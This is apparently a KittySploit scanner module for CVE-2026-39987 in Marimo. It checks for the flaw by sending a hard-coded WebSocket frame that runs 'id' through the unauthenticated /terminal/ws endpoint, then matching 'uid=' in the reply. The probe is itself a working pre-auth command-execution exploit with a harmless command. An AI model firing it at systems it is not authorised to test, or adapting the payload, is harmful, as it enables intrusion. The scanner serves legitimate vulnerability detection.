#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.websocket.websocket_client import (
    WebsocketTimeoutException,
    Websocket_client,
)

VULN_PATTERN = re.compile(r"uid=\d+\([^)]+\)")

class Module(Scanner, Websocket_client):

    __info__ = {
        "name": "Marimo pre-auth terminal WebSocket RCE detection",
        "description": (
            "Detects potential exposure to CVE-2026-39987 by verifying whether the "
            "Marimo terminal WebSocket endpoint can be reached pre-authentication and "
            "returns command execution output."
        ),
        "author": "ritikchaddha, KittySploit Team",
        "severity": "critical",
        "modules": [],
        "references": [
            "https://github.com/advisories/GHSA-2679-6mx9-h9xc",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-39987",
            "https://github.com/marimo-team/marimo",
        ],
        "cve": "CVE-2026-39987",
        "tags": ["web", "scanner", "marimo", "websocket", "rce", "cve-2026-39987"],
    }

    path = OptString("/terminal/ws", "Target WebSocket endpoint path", True)

    def _probe_terminal_socket(self) -> str:
        # Pre-built binary frame observed to trigger an `id` response in vulnerable setups.
        payload = bytes.fromhex("818337fa1e2d5e9e14")
        output = b""

        self.ws_connect()
        self.ws_send(payload, opcode="binary")

        for _ in range(5):
            try:
                chunk = self.ws_recv()
            except WebsocketTimeoutException:
                break

            if not chunk:
                continue
            output += chunk if isinstance(chunk, bytes) else chunk.encode()
            if b"uid=" in output:
                break

        return output.decode(errors="ignore")

    def run(self):
        try:
            output = self._probe_terminal_socket()
            if VULN_PATTERN.search(output):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-39987",
                    reason="Unauthenticated terminal WebSocket returns command execution output",
                    endpoint=self.path,
                    evidence="uid=... pattern observed in WebSocket response",
                    service="marimo",
                )
                return True
        except Exception:
            return False
        finally:
            self.ws_close()

        return False
